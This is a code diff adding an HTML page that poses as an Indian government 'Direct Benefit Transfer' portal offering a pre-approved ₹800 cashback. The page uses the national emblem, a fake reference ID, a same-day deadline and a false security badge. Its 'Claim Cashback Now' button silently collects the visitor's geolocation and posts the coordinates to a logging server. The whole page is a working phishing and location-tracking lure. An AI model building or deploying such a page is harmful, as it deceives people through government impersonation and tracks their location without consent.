@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Govt Cashback | DBT Portal</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="gov-header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/29/Ashoka_Chakra.svg/100px-Ashoka_Chakra.svg.png" alt="Emblem">
+    <span>Government of India - Direct Benefit Transfer Portal</span>
+  </div>
+
+  <div class="container">
+    <div class="card">
+
+      <div class="tick-badge">✅</div>
+
+      <h1>₹800 Cashback Approved</h1>
+      <p class="tagline">under PM Direct Benefit Transfer (DBT-UPI) Scheme</p>
+
+      <div class="info-box">
+        <p><span>🟢 Status:</span> Pre-approved</p>
+        <p><span>📄 Reference ID:</span> DBT-UPI-754XK2</p>
+        <p><span>⏰ Claim By:</span> Today, 11:59 PM</p>
+      </div>
+
+      <p class="subtext">Confirm your identity and location to receive cashback instantly.</p>
+
+      <a href="#" onclick="trackClick()" class="cta-btn">💰 Claim Cashback Now</a>
+
+      <div class="secure">
+        <img src="https://img.icons8.com/ios-filled/18/lock.png" alt="lock">
+        Secured by Bharat Portal | UPI Verified
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function trackClick() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          fetch('http://localhost:3000/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lng: position.coords.longitude,
+              timestamp: Date.now()
+            })
+          });
+        });
+      } else {
+        alert("Geolocation is not supported.");
+      }
+    }
+  </script>
+</body>
+</html>
